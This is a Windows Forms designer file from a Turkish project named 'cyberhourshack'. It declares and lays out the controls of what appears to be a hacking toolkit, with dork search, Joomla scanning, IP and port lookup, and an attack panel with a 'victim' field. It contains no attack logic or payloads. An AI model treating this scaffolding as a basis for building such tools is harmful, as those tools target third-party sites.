﻿namespace cyberhourshack
{
    partial class Form1
    {
        /// <summary>
        ///Gerekli tasarımcı değişkeni.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        ///Kullanılan tüm kaynakları temizleyin.
        /// </summary>
        ///<param name="disposing">yönetilen kaynaklar dispose edilmeliyse doğru; aksi halde yanlış.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer üretilen kod

        /// <summary>
        /// Tasarımcı desteği için gerekli metot - bu metodun 
        ///içeriğini kod düzenleyici ile değiştirmeyin.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.panel1 = new System.Windows.Forms.Panel();
            this.panel15 = new System.Windows.Forms.Panel();
            this.recuperareIIButton38 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton37 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton36 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton25 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton24 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton23 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton22 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton17 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton16 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton12 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton1 = new RecuperareIIC.RecuperareIIButton();
            this.pictureBox10 = new System.Windows.Forms.PictureBox();
            this.panel8 = new System.Windows.Forms.Panel();
            this.recuperareIIButton2 = new RecuperareIIC.RecuperareIIButton();
            this.panel7 = new System.Windows.Forms.Panel();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.panel2 = new System.Windows.Forms.Panel();
            this.textBox1 = new Ambiance.Ambiance_TextBox();
            this.recuperareIIButton6 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton5 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton4 = new RecuperareIIC.RecuperareIIButton();
            this.ambiance_Button_22 = new Ambiance.Ambiance_Button_2();
            this.ambiance_Button_21 = new Ambiance.Ambiance_Button_2();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.listBox3 = new System.Windows.Forms.ListBox();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.search = new System.Windows.Forms.ListBox();
            this.label11 = new System.Windows.Forms.Label();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.ambiance_TextBox1 = new Ambiance.Ambiance_TextBox();
            this.effectualButtonBlue3 = new EffectualButtonBlue();
            this.listBox1 = new System.Windows.Forms.ListBox();
            this.panel6 = new System.Windows.Forms.Panel();
            this.panel5 = new System.Windows.Forms.Panel();
            this.panel4 = new System.Windows.Forms.Panel();
            this.panel3 = new System.Windows.Forms.Panel();
            this.label10 = new System.Windows.Forms.Label();
            this.button1 = new System.Windows.Forms.Button();
            this.Saat = new System.Windows.Forms.Timer(this.components);
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.pictureBox9 = new System.Windows.Forms.PictureBox();
            this.pictureBox3 = new System.Windows.Forms.PictureBox();
            this.pictureBox4 = new System.Windows.Forms.PictureBox();
            this.pictureBox8 = new System.Windows.Forms.PictureBox();
            this.pictureBox5 = new System.Windows.Forms.PictureBox();
            this.pictureBox6 = new System.Windows.Forms.PictureBox();
            this.pictureBox7 = new System.Windows.Forms.PictureBox();
            this.panel9 = new System.Windows.Forms.Panel();
            this.iTalk_GroupBox5 = new iTalk.iTalk_GroupBox();
            this.webBrowser2 = new System.Windows.Forms.WebBrowser();
            this.button5 = new System.Windows.Forms.Button();
            this.iTalk_Button_27 = new iTalk.iTalk_Button_2();
            this.iTalk_Button_28 = new iTalk.iTalk_Button_2();
            this.iTalk_Button_29 = new iTalk.iTalk_Button_2();
            this.iTalk_Button_210 = new iTalk.iTalk_Button_2();
            this.label19 = new System.Windows.Forms.Label();
            this.label20 = new System.Windows.Forms.Label();
            this.listBox5 = new System.Windows.Forms.ListBox();
            this.label18 = new System.Windows.Forms.Label();
            this.label16 = new System.Windows.Forms.Label();
            this.özeldork = new iTalk.iTalk_TextBox_Small();
            this.label17 = new System.Windows.Forms.Label();
            this.hazırdork = new iTalk.iTalk_ComboBox();
            this.iTalk_GroupBox4 = new iTalk.iTalk_GroupBox();
            this.webBrowser1 = new System.Windows.Forms.WebBrowser();
            this.button4 = new System.Windows.Forms.Button();
            this.iTalk_Button_26 = new iTalk.iTalk_Button_2();
            this.iTalk_Button_25 = new iTalk.iTalk_Button_2();
            this.iTalk_Button_24 = new iTalk.iTalk_Button_2();
            this.iTalk_Button_23 = new iTalk.iTalk_Button_2();
            this.label15 = new System.Windows.Forms.Label();
            this.label21 = new System.Windows.Forms.Label();
            this.listBox4 = new System.Windows.Forms.ListBox();
            this.label22 = new System.Windows.Forms.Label();
            this.label23 = new System.Windows.Forms.Label();
            this.özel = new iTalk.iTalk_TextBox_Small();
            this.hazır = new iTalk.iTalk_ComboBox();
            this.label24 = new System.Windows.Forms.Label();
            this.panel14 = new System.Windows.Forms.Panel();
            this.panel13 = new System.Windows.Forms.Panel();
            this.panel12 = new System.Windows.Forms.Panel();
            this.panel11 = new System.Windows.Forms.Panel();
            this.label14 = new System.Windows.Forms.Label();
            this.button2 = new System.Windows.Forms.Button();
            this.dorkt = new System.Windows.Forms.Timer(this.components);
            this.joomla = new System.Windows.Forms.Timer(this.components);
            this.panel16 = new System.Windows.Forms.Panel();
            this.iTalk_GroupBox16 = new iTalk.iTalk_GroupBox();
            this.monoFlat_Button3 = new MonoFlat.MonoFlat_Button();
            this.monoFlat_Button2 = new MonoFlat.MonoFlat_Button();
            this.monoFlat_Button1 = new MonoFlat.MonoFlat_Button();
            this.listBox2 = new System.Windows.Forms.ListBox();
            this.button11 = new System.Windows.Forms.Button();
            this.button12 = new System.Windows.Forms.Button();
            this.button13 = new System.Windows.Forms.Button();
            this.button14 = new System.Windows.Forms.Button();
            this.saldır = new iTalk.iTalk_TextBox_Small();
            this.iTalk_TextBox_Small3 = new iTalk.iTalk_TextBox_Small();
            this.label48 = new System.Windows.Forms.Label();
            this.label47 = new System.Windows.Forms.Label();
            this.iTalk_GroupBox12 = new iTalk.iTalk_GroupBox();
            this.recuperareIIButton15 = new RecuperareIIC.RecuperareIIButton();
            this.sorgula = new RecuperareIIC.RecuperareIIButton();
            this.label36 = new System.Windows.Forms.Label();
            this.txtport = new iTalk.iTalk_TextBox_Small();
            this.label34 = new System.Windows.Forms.Label();
            this.txtıp = new iTalk.iTalk_TextBox_Small();
            this.label35 = new System.Windows.Forms.Label();
            this.iTalk_GroupBox14 = new iTalk.iTalk_GroupBox();
            this.recuperareIIButton13 = new RecuperareIIC.RecuperareIIButton();
            this.iTalk_Button_213 = new RecuperareIIC.RecuperareIIButton();
            this.label46 = new System.Windows.Forms.Label();
            this.label45 = new System.Windows.Forms.Label();
            this.label44 = new System.Windows.Forms.Label();
            this.label37 = new System.Windows.Forms.Label();
            this.iTalk_GroupBox13 = new iTalk.iTalk_GroupBox();
            this.recuperareIIButton14 = new RecuperareIIC.RecuperareIIButton();
            this.ıpbul = new RecuperareIIC.RecuperareIIButton();
            this.ıp = new iTalk.iTalk_TextBox_Small();
            this.label33 = new System.Windows.Forms.Label();
            this.url = new iTalk.iTalk_TextBox_Small();
            this.label32 = new System.Windows.Forms.Label();
            this.panel20 = new System.Windows.Forms.Panel();
            this.panel19 = new System.Windows.Forms.Panel();
            this.panel18 = new System.Windows.Forms.Panel();
            this.panel17 = new System.Windows.Forms.Panel();
            this.label25 = new System.Windows.Forms.Label();
            this.button3 = new System.Windows.Forms.Button();
            this.timer9 = new System.Windows.Forms.Timer(this.components);
            this.timer10 = new System.Windows.Forms.Timer(this.components);
            this.panel21 = new System.Windows.Forms.Panel();
            this.webBrowser3 = new System.Windows.Forms.WebBrowser();
            this.panel24 = new System.Windows.Forms.Panel();
            this.panel23 = new System.Windows.Forms.Panel();
            this.panel25 = new System.Windows.Forms.Panel();
            this.panel22 = new System.Windows.Forms.Panel();
            this.ambiance_Button_25 = new Ambiance.Ambiance_Button_2();
            this.ambiance_Button_24 = new Ambiance.Ambiance_Button_2();
            this.ambiance_Button_23 = new Ambiance.Ambiance_Button_2();
            this.pictureBox14 = new System.Windows.Forms.PictureBox();
            this.label26 = new System.Windows.Forms.Label();
            this.pictureBox13 = new System.Windows.Forms.PictureBox();
            this.pictureBox12 = new System.Windows.Forms.PictureBox();
            this.panel26 = new System.Windows.Forms.Panel();
            this.iTalk_GroupBox2 = new iTalk.iTalk_GroupBox();
            this.pictureBox16 = new System.Windows.Forms.PictureBox();
            this.recuperareIIButton20 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton19 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton18 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton21 = new RecuperareIIC.RecuperareIIButton();
            this.pictureBox15 = new System.Windows.Forms.PictureBox();
            this.listBox6 = new System.Windows.Forms.ListBox();
            this.iTalk_GroupBox1 = new iTalk.iTalk_GroupBox();
            this.monoFlat_Button6 = new MonoFlat.MonoFlat_Button();
            this.monoFlat_Button5 = new MonoFlat.MonoFlat_Button();
            this.monoFlat_Button4 = new MonoFlat.MonoFlat_Button();
            this.hours = new Ambiance.Ambiance_NumericUpDown();
            this.atak = new Ambiance.Ambiance_TextBox();
            this.label31 = new System.Windows.Forms.Label();
            this.label30 = new System.Windows.Forms.Label();
            this.panel30 = new System.Windows.Forms.Panel();
            this.panel29 = new System.Windows.Forms.Panel();
            this.panel28 = new System.Windows.Forms.Panel();
            this.panel27 = new System.Windows.Forms.Panel();
            this.label27 = new System.Windows.Forms.Label();
            this.button6 = new System.Windows.Forms.Button();
            this.timer4 = new System.Windows.Forms.Timer(this.components);
            this.timer5 = new System.Windows.Forms.Timer(this.components);
            this.panel31 = new System.Windows.Forms.Panel();
            this.iTalk_GroupBox9 = new iTalk.iTalk_GroupBox();
            this.textBox2 = new Ambiance.Ambiance_TextBox();
            this.textBox3 = new System.Windows.Forms.TextBox();
            this.label49 = new System.Windows.Forms.Label();
            this.label50 = new System.Windows.Forms.Label();
            this.iTalk_GroupBox8 = new iTalk.iTalk_GroupBox();
            this.saldırıd = new MonoFlat.MonoFlat_Button();
            this.KURBAN = new Ambiance.Ambiance_TextBox();
            this.saldırı = new MonoFlat.MonoFlat_Button();
            this.up = new System.Windows.Forms.NumericUpDown();
            this.label43 = new System.Windows.Forms.Label();
            this.iTalk_GroupBox7 = new iTalk.iTalk_GroupBox();
            this.TXT4 = new Ambiance.Ambiance_TextBox();
            this.gizle = new System.Windows.Forms.CheckBox();
            this.label41 = new System.Windows.Forms.Label();
            this.TXT3 = new Ambiance.Ambiance_TextBox();
            this.label42 = new System.Windows.Forms.Label();
            this.iTalk_GroupBox3 = new iTalk.iTalk_GroupBox();
            this.com3 = new RecuperareIIC.RecuperareIIComboBox();
            this.com1 = new RecuperareIIC.RecuperareIIComboBox();
            this.com2 = new RecuperareIIC.RecuperareIIComboBox();
            this.label29 = new System.Windows.Forms.Label();
            this.label38 = new System.Windows.Forms.Label();
            this.label39 = new System.Windows.Forms.Label();
            this.label40 = new System.Windows.Forms.Label();
            this.panel35 = new System.Windows.Forms.Panel();
            this.panel34 = new System.Windows.Forms.Panel();
            this.panel33 = new System.Windows.Forms.Panel();
            this.panel32 = new System.Windows.Forms.Panel();
            this.label28 = new System.Windows.Forms.Label();
            this.button7 = new System.Windows.Forms.Button();
            this.timer8 = new System.Windows.Forms.Timer(this.components);
            this.panel36 = new System.Windows.Forms.Panel();
            this.monoFlat_Button9 = new MonoFlat.MonoFlat_Button();
            this.monoFlat_Button8 = new MonoFlat.MonoFlat_Button();
            this.monoFlat_Button7 = new MonoFlat.MonoFlat_Button();
            this.iTalk_GroupBox10 = new iTalk.iTalk_GroupBox();
            this.textBox16 = new System.Windows.Forms.TextBox();
            this.textBox15 = new System.Windows.Forms.TextBox();
            this.textBox13 = new System.Windows.Forms.TextBox();
            this.textBox12 = new System.Windows.Forms.TextBox();
            this.textBox11 = new System.Windows.Forms.TextBox();
            this.textBox10 = new System.Windows.Forms.TextBox();
            this.textBox9 = new System.Windows.Forms.TextBox();
            this.textBox8 = new System.Windows.Forms.TextBox();
            this.textBox7 = new System.Windows.Forms.TextBox();
            this.textBox6 = new System.Windows.Forms.TextBox();
            this.textBox5 = new System.Windows.Forms.TextBox();
            this.iTalk_RadioButton4 = new iTalk.iTalk_RadioButton();
            this.iTalk_RadioButton3 = new iTalk.iTalk_RadioButton();
            this.iTalk_RadioButton2 = new iTalk.iTalk_RadioButton();
            this.iTalk_RadioButton1 = new iTalk.iTalk_RadioButton();
            this.textBox4 = new System.Windows.Forms.TextBox();
            this.iTalk_GroupBox6 = new iTalk.iTalk_GroupBox();
            this.effectualButtonBlue10 = new EffectualButtonBlue();
            this.effectualButtonBlue11 = new EffectualButtonBlue();
            this.effectualButtonBlue12 = new EffectualButtonBlue();
            this.effectualButtonBlue9 = new EffectualButtonBlue();
            this.effectualButtonBlue8 = new EffectualButtonBlue();
            this.effectualButtonBlue7 = new EffectualButtonBlue();
            this.effectualButtonBlue6 = new EffectualButtonBlue();
            this.effectualButtonBlue5 = new EffectualButtonBlue();
            this.effectualButtonBlue4 = new EffectualButtonBlue();
            this.effectualButtonBlue2 = new EffectualButtonBlue();
            this.effectualButtonBlue1 = new EffectualButtonBlue();
            this.panel40 = new System.Windows.Forms.Panel();
            this.panel39 = new System.Windows.Forms.Panel();
            this.panel38 = new System.Windows.Forms.Panel();
            this.panel37 = new System.Windows.Forms.Panel();
            this.label51 = new System.Windows.Forms.Label();
            this.button8 = new System.Windows.Forms.Button();
            this.panel41 = new System.Windows.Forms.Panel();
            this.iTalk_GroupBox19 = new iTalk.iTalk_GroupBox();
            this.label62 = new System.Windows.Forms.Label();
            this.label60 = new System.Windows.Forms.Label();
            this.pictureBox25 = new System.Windows.Forms.PictureBox();
            this.label61 = new System.Windows.Forms.Label();
            this.pictureBox26 = new System.Windows.Forms.PictureBox();
            this.pictureBox23 = new System.Windows.Forms.PictureBox();
            this.pictureBox24 = new System.Windows.Forms.PictureBox();
            this.label58 = new System.Windows.Forms.Label();
            this.label59 = new System.Windows.Forms.Label();
            this.label57 = new System.Windows.Forms.Label();
            this.pictureBox22 = new System.Windows.Forms.PictureBox();
            this.pictureBox20 = new System.Windows.Forms.PictureBox();
            this.label55 = new System.Windows.Forms.Label();
            this.label56 = new System.Windows.Forms.Label();
            this.pictureBox21 = new System.Windows.Forms.PictureBox();
            this.pictureBox19 = new System.Windows.Forms.PictureBox();
            this.label54 = new System.Windows.Forms.Label();
            this.iTalk_GroupBox18 = new iTalk.iTalk_GroupBox();
            this.monoFlat_Button23 = new MonoFlat.MonoFlat_Button();
            this.monoFlat_Button22 = new MonoFlat.MonoFlat_Button();
            this.iTalk_GroupBox17 = new iTalk.iTalk_GroupBox();
            this.pictureBox18 = new System.Windows.Forms.PictureBox();
            this.pictureBox17 = new System.Windows.Forms.PictureBox();
            this.label53 = new System.Windows.Forms.Label();
            this.monoFlat_Button21 = new MonoFlat.MonoFlat_Button();
            this.monoFlat_Button20 = new MonoFlat.MonoFlat_Button();
            this.iTalk_GroupBox15 = new iTalk.iTalk_GroupBox();
            this.monoFlat_Button15 = new MonoFlat.MonoFlat_Button();
            this.monoFlat_Button16 = new MonoFlat.MonoFlat_Button();
            this.monoFlat_Button17 = new MonoFlat.MonoFlat_Button();
            this.monoFlat_Button18 = new MonoFlat.MonoFlat_Button();
            this.monoFlat_Button19 = new MonoFlat.MonoFlat_Button();
            this.iTalk_GroupBox11 = new iTalk.iTalk_GroupBox();
            this.monoFlat_Button14 = new MonoFlat.MonoFlat_Button();
            this.monoFlat_Button13 = new MonoFlat.MonoFlat_Button();
            this.monoFlat_Button12 = new MonoFlat.MonoFlat_Button();
            this.monoFlat_Button11 = new MonoFlat.MonoFlat_Button();
            this.monoFlat_Button10 = new MonoFlat.MonoFlat_Button();
            this.panel45 = new System.Windows.Forms.Panel();
            this.panel44 = new System.Windows.Forms.Panel();
            this.panel43 = new System.Windows.Forms.Panel();
            this.panel42 = new System.Windows.Forms.Panel();
            this.label52 = new System.Windows.Forms.Label();
            this.button9 = new System.Windows.Forms.Button();
            this.colorDialog1 = new System.Windows.Forms.ColorDialog();
            this.openFileDialog1 = new System.Windows.Forms.OpenFileDialog();
            this.panel46 = new System.Windows.Forms.Panel();
            this.recuperareIIButton35 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton34 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton33 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton32 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton31 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton30 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton29 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton28 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton27 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton26 = new RecuperareIIC.RecuperareIIButton();
            this.panel50 = new System.Windows.Forms.Panel();
            this.panel49 = new System.Windows.Forms.Panel();
            this.panel48 = new System.Windows.Forms.Panel();
            this.panel47 = new System.Windows.Forms.Panel();
            this.label63 = new System.Windows.Forms.Label();
            this.button10 = new System.Windows.Forms.Button();
            this.panel51 = new System.Windows.Forms.Panel();
            this.iTalk_GroupBox21 = new iTalk.iTalk_GroupBox();
            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
            this.iTalk_GroupBox20 = new iTalk.iTalk_GroupBox();
            this.effectualRadioButton6 = new EffectualRadioButton();
            this.label66 = new System.Windows.Forms.Label();
            this.effectualRadioButton5 = new EffectualRadioButton();
            this.monoFlat_Button26 = new MonoFlat.MonoFlat_Button();
            this.effectualRadioButton4 = new EffectualRadioButton();
            this.effectualRadioButton3 = new EffectualRadioButton();
            this.effectualRadioButton2 = new EffectualRadioButton();
            this.effectualRadioButton1 = new EffectualRadioButton();
            this.monoFlat_Button25 = new MonoFlat.MonoFlat_Button();
            this.ambiance_TextBox2 = new Ambiance.Ambiance_TextBox();
            this.monoFlat_Button24 = new MonoFlat.MonoFlat_Button();
            this.label65 = new System.Windows.Forms.Label();
            this.panel55 = new System.Windows.Forms.Panel();
            this.panel54 = new System.Windows.Forms.Panel();
            this.panel53 = new System.Windows.Forms.Panel();
            this.panel52 = new System.Windows.Forms.Panel();
            this.label64 = new System.Windows.Forms.Label();
            this.button15 = new System.Windows.Forms.Button();
            this.label67 = new System.Windows.Forms.Label();
            this.pictureBox27 = new System.Windows.Forms.PictureBox();
            this.panel56 = new System.Windows.Forms.Panel();
            this.iTalk_GroupBox22 = new iTalk.iTalk_GroupBox();
            this.label95 = new System.Windows.Forms.Label();
            this.label78 = new System.Windows.Forms.Label();
            this.label76 = new System.Windows.Forms.Label();
            this.label77 = new System.Windows.Forms.Label();
            this.label70 = new System.Windows.Forms.Label();
            this.label71 = new System.Windows.Forms.Label();
            this.label72 = new System.Windows.Forms.Label();
            this.label73 = new System.Windows.Forms.Label();
            this.label74 = new System.Windows.Forms.Label();
            this.label75 = new System.Windows.Forms.Label();
            this.effectualButtonBlue22 = new EffectualButtonBlue();
            this.effectualButtonBlue21 = new EffectualButtonBlue();
            this.effectualButtonBlue20 = new EffectualButtonBlue();
            this.effectualButtonBlue18 = new EffectualButtonBlue();
            this.effectualButtonBlue19 = new EffectualButtonBlue();
            this.effectualButtonBlue17 = new EffectualButtonBlue();
            this.label69 = new System.Windows.Forms.Label();
            this.effectualButtonBlue16 = new EffectualButtonBlue();
            this.effectualButtonBlue15 = new EffectualButtonBlue();
            this.effectualButtonBlue14 = new EffectualButtonBlue();
            this.effectualButtonBlue13 = new EffectualButtonBlue();
            this.panel60 = new System.Windows.Forms.Panel();
            this.panel59 = new System.Windows.Forms.Panel();
            this.panel58 = new System.Windows.Forms.Panel();
            this.panel57 = new System.Windows.Forms.Panel();
            this.ambiance_Button_26 = new Ambiance.Ambiance_Button_2();
            this.label68 = new System.Windows.Forms.Label();
            this.panel62 = new System.Windows.Forms.Panel();
            this.button22 = new System.Windows.Forms.Button();
            this.button21 = new System.Windows.Forms.Button();
            this.label83 = new System.Windows.Forms.Label();
            this.button19 = new System.Windows.Forms.Button();
            this.button20 = new System.Windows.Forms.Button();
            this.panel10 = new System.Windows.Forms.Panel();
            this.effectualGroupBox1 = new EffectualGroupBox();
            this.label82 = new System.Windows.Forms.Label();
            this.label81 = new System.Windows.Forms.Label();
            this.label80 = new System.Windows.Forms.Label();
            this.recuperareIIButton3 = new RecuperareIIC.RecuperareIIButton();
            this.label9 = new System.Windows.Forms.Label();
            this.label13 = new System.Windows.Forms.Label();
            this.label12 = new System.Windows.Forms.Label();
            this.label84 = new System.Windows.Forms.Label();
            this.label85 = new System.Windows.Forms.Label();
            this.label86 = new System.Windows.Forms.Label();
            this.label87 = new System.Windows.Forms.Label();
            this.label88 = new System.Windows.Forms.Label();
            this.label89 = new System.Windows.Forms.Label();
            this.label90 = new System.Windows.Forms.Label();
            this.label91 = new System.Windows.Forms.Label();
            this.label92 = new System.Windows.Forms.Label();
            this.label93 = new System.Windows.Forms.Label();
            this.label94 = new System.Windows.Forms.Label();
            this.iTalk_Panel1 = new iTalk.iTalk_Panel();
            this.monoFlat_Button27 = new MonoFlat.MonoFlat_Button();
            this.panel61 = new System.Windows.Forms.Panel();
            this.label79 = new System.Windows.Forms.Label();
            this.pictureBox28 = new System.Windows.Forms.PictureBox();
            this.recuperareIIButton7 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton8 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton11 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton9 = new RecuperareIIC.RecuperareIIButton();
            this.recuperareIIButton10 = new RecuperareIIC.RecuperareIIButton();
            this.panel1.SuspendLayout();
            this.panel15.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox10)).BeginInit();
            this.panel8.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.panel2.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.groupBox1.SuspendLayout();
            this.panel3.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox9)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox4)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox8)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox5)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox6)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox7)).BeginInit();
            this.panel9.SuspendLayout();
            this.iTalk_GroupBox5.SuspendLayout();
            this.iTalk_GroupBox4.SuspendLayout();
            this.panel11.SuspendLayout();
            this.panel16.SuspendLayout();
            this.iTalk_GroupBox16.SuspendLayout();
            this.iTalk_GroupBox12.SuspendLayout();
            this.iTalk_GroupBox14.SuspendLayout();
            this.iTalk_GroupBox13.SuspendLayout();
            this.panel17.SuspendLayout();
            this.panel21.SuspendLayout();
            this.panel22.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox14)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox13)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox12)).BeginInit();
            this.panel26.SuspendLayout();
            this.iTalk_GroupBox2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox16)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox15)).BeginInit();
            this.iTalk_GroupBox1.SuspendLayout();
            this.panel27.SuspendLayout();
            this.panel31.SuspendLayout();
            this.iTalk_GroupBox9.SuspendLayout();
            this.iTalk_GroupBox8.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.up)).BeginInit();
            this.iTalk_GroupBox7.SuspendLayout();
            this.iTalk_GroupBox3.SuspendLayout();
            this.panel32.SuspendLayout();
            this.panel36.SuspendLayout();
            this.iTalk_GroupBox10.SuspendLayout();
            this.iTalk_GroupBox6.SuspendLayout();
            this.panel37.SuspendLayout();
            this.panel41.SuspendLayout();
            this.iTalk_GroupBox19.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox25)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox26)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox23)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox24)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox22)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox20)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox21)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox19)).BeginInit();
            this.iTalk_GroupBox18.SuspendLayout();
            this.iTalk_GroupBox17.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox18)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox17)).BeginInit();
            this.iTalk_GroupBox15.SuspendLayout();
            this.iTalk_GroupBox11.SuspendLayout();
            this.panel42.SuspendLayout();
            this.panel46.SuspendLayout();
            this.panel47.SuspendLayout();
            this.panel51.SuspendLayout();
            this.iTalk_GroupBox21.SuspendLayout();
            this.iTalk_GroupBox20.SuspendLayout();
            this.panel52.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox27)).BeginInit();
            this.panel56.SuspendLayout();
            this.iTalk_GroupBox22.SuspendLayout();
            this.panel57.SuspendLayout();
            this.panel62.SuspendLayout();
            this.panel10.SuspendLayout();
            this.effectualGroupBox1.SuspendLayout();
            this.iTalk_Panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox28)).BeginInit();
            this.SuspendLayout();
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.Color.SlateGray;
            this.panel1.Controls.Add(this.panel15);
            this.panel1.Controls.Add(this.pictureBox10);
            this.panel1.Controls.Add(this.panel8);
            this.panel1.Controls.Add(this.panel7);
            this.panel1.Controls.Add(this.pictureBox1);
            this.panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel1.Location = new System.Drawing.Point(0, 772);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(1431, 41);
            this.panel1.TabIndex = 0;
            // 
            // panel15
            // 
            this.panel15.Controls.Add(this.recuperareIIButton38);
            this.panel15.Controls.Add(this.recuperareIIButton37);
            this.panel15.Controls.Add(this.recuperareIIButton36);
            this.panel15.Controls.Add(this.recuperareIIButton25);
            this.panel15.Controls.Add(this.recuperareIIButton24);
            this.panel15.Controls.Add(this.recuperareIIButton23);
            this.panel15.Controls.Add(this.recuperareIIButton22);
            this.panel15.Controls.Add(this.recuperareIIButton17);
            this.panel15.Controls.Add(this.recuperareIIButton16);
            this.panel15.Controls.Add(this.recuperareIIButton12);
            this.panel15.Controls.Add(this.recuperareIIButton1);
            this.panel15.Location = new System.Drawing.Point(55, 0);
            this.panel15.Name = "panel15";
            this.panel15.Size = new System.Drawing.Size(895, 41);
            this.panel15.TabIndex = 22;
            // 
            // recuperareIIButton38
            // 
            this.recuperareIIButton38.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton38.Dock = System.Windows.Forms.DockStyle.Left;
            this.recuperareIIButton38.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton38.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton38.Location = new System.Drawing.Point(750, 0);
            this.recuperareIIButton38.Name = "recuperareIIButton38";
            this.recuperareIIButton38.Size = new System.Drawing.Size(75, 41);
            this.recuperareIIButton38.TabIndex = 31;
            this.recuperareIIButton38.Text = "GÖREV YÖNETİCİSİ";
            // 
            // recuperareIIButton37
            // 
            this.recuperareIIButton37.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton37.Dock = System.Windows.Forms.DockStyle.Left;
            this.recuperareIIButton37.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton37.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton37.Location = new System.Drawing.Point(675, 0);
            this.recuperareIIButton37.Name = "recuperareIIButton37";
            this.recuperareIIButton37.Size = new System.Drawing.Size(75, 41);
            this.recuperareIIButton37.TabIndex = 30;
            this.recuperareIIButton37.Text = "İNDEX KOD";
            // 
            // recuperareIIButton36
            // 
